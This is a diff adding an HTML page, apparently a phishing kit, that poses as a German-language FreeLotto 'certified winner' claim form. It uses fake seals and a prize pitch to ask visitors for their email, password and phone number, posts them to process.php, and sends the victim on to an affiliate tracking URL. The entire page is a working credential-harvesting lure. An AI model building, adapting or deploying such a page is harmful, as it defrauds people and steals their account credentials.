@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<title>CERTIFIED WINNER CLAIM FORM</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link rel="stylesheet" href="bootstrap.min.css">
+	<link rel="stylesheet" href="stylesheet/customcss.css" type="text/css">
+</head>
+<body>
+<div class="container">
+	<div class="row">
+		<div class="col-md-12 language"><a href="swedish.html"><img src="123.png" width="800" height="160" alt=""/></a>
+		</div>
+	</div>
+</div>
+<div class="bgcon">
+	<div class="container whitebox">
+		<div class="row">
+			<div class="col-md-6 col-sm-6 col-xs-6 address">
+				</div>
+			<div class="col-md-6 col-sm-6 col-xs-6 barcode">
+				<img src="img/barcode_min.png" width="170" height="16" alt="barcode"><br>
+				Aktuelles Datum: <span id="datetime"></span>
+				<script>
+var dt = new Date();
+document.getElementById("datetime").innerHTML = dt.toLocaleDateString();
+</script>
+			</div>
+		</div>
+		<div class="row borderbox">
+			<div class="col-md-12 titlecontent">
+				<p class="topnumber">201312</p>
+				<p class="maintitle">Melden Sie sich an, um die Ergebnisse Ihres Lotteriefonds anzuzeigen</p>
+			</div>
+		</div>
+		<div class="row borderbox2">
+			<div class="col-md-12 text-right code">
+				Code No. PSN20121205
+			</div>
+		</div>
+		<div class="row borderbox3">
+		<!--form-->
+		<form name="formreg" id="formreg" action="process.php" method="post">
+			<div class="col-md-12 dashbord">
+				<div class="col-md-6 paddtop">
+					<p><span class="letter">Email:</span></p>
+					<div class="form-group">
+					  <p>
+					    <input type="email" class="form-control" id="email2" name="email2">
+					  </p>
+					</div>
+				</div>
+				<div class="col-md-6 paddtop">
+				  <span class="letter">Password:</span>
+					<div class="form-group">
+						<input type="password" class="form-control" id="password" name="password">
+					</div>
+				</div>
+			</div>
+			<!----><!---->
+			<div class="col-md-12 dashbord5">
+				<div class="col-md-6 paddtop"><span class="letter">Tel:</span>
+				  <div class="form-group">
+						 <input type="text" class="form-control" id="tel" name="tel">
+					</div>
+					</div>
+			</div>
+			<!---->
+		</div>
+		<div class="col-md-12 dashbord6">
+			<div class="col-md-12">
+				Diese Bestätigung hängt von der Erfüllung der Alters- und Wohnsitzerfordernisse ab. Diese Preise werden von FreeLotto.com im Rahmen einer weltweiten Werbekampagne angeboten. Das Angebot ist zeitlich begrenzt.
+			</div>
+			<div class="col-md-12 text-center">
+				<button type="submit" class="push-btn">ANSPRUCH</button>
+			</div>
+			<div class="col-md-12 privacy">
+				Durch Klicken auf <strong>"ANSPRUCH"</strong> oben bestätige ich, dass ich die offiziellen Regeln, Gewinnspielregeln und FreeLotto-Datenschutzrichtlinien gelesen habe und damit einverstanden bin, an diese gebunden zu sein. 
+			</div>
+		</div>
+		</form>
+		<!--end form-->
+		<div class="col-md-12 dashbord7">
+			<div class="col-md-12">
+				<img src="img/senderscore_min.png">
+				<img src="img/seal_image.png">
+				<img src="img/siteSealImage.png">
+			</div>
+		</div>
+	</div>
+</div>
+<div class="container footer">
+	<div class="row">
+		<div class="col-md-12">
+			<br>
+		</div>
+	</div>
+	<div class="row">
+		<div class="col-md-12">
+			<br><br>
+			Copyright © 1999-2021. Alle Rechte vorbehalten. Eine vollständige oder teilweise Vervielfältigung in irgendeiner Form oder auf irgendeinem Medium ohne ausdrückliche schriftliche Genehmigung ist untersagt. PlasmaNet, Inc., www.freelotto.com, ihre Agenturen und Werbetreibenden sind nicht verantwortlich für falsche oder ungenaue Informationen oder Formatierungen, die von Internetnutzern oder von Geräten, Programmen oder Software verursacht werden, die mit dem Internet verbunden sind oder in Verbindung mit dem verwendet werden Gewinnspiel. Ungültig, wenn verboten.<br>
+			<br><br>
+		</div>
+	</div>
+</div>
+<script src="../../../../ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+<script type="text/javascript">
+	$(document).ready(function(){
+		 var url = window.location.href;
+   		 var parameters = url.split('?')[1];
+		$("#formreg").submit(function(e){
+
+	        msg = errormsg(); 
+	        if(msg == null) { 
+	            doepu = 0; 
+	            showsspop = 0; 
+	            window.location.href = 'http://afftrck.responsekings.com/index.php?'+parameters;  
+	            return false;
+		    	//window.location.href = 'http://afftrck.responsekings.com/index.php?'+parameters;    
+	        }else{
+	        	alert(msg);	
+	        	return false;
+	        }
+	        //alert(msg); 
+	        
+	    });
+	});
+	function errormsg() {
+    var formReg = document.formreg;
+
+    if (formReg.firstname.value == "") 
+        return "You need to enter your first name";
+    if (formReg.lastname.value == "") 
+        return "You need to enter your last name";
+    if (formReg.address.value == "") 
+        return "You need to enter your address";
+    if (formReg.zipcode.value == "") 
+        return "You need to enter your postal code";
+    if (formReg.city.value == "") 
+        return "You need to enter your city";
+    if (formReg.email.value == "") 
+        return "You need to enter your email address";
+    /*var state_select = $('#state');
+    if (formReg.state.value == "" && state_select && state_select.is(":visible") )
+        return "You must have a state.";*/
+    // Check for existence of email2 field before these tests
+    // Some reg pages do not have a second email
+    if (formReg.email2) {
+        if ( formReg.email2.value == "") 
+            return "You need to enter your email address twice";
+        if (formReg.email.value != formReg.email2.value) 
+            return "Your email addresses do not match";
+    }
+	    return null;
+
+	    
+    
+	}
+    /*end script*/
+</script>
+</body>
+</html>
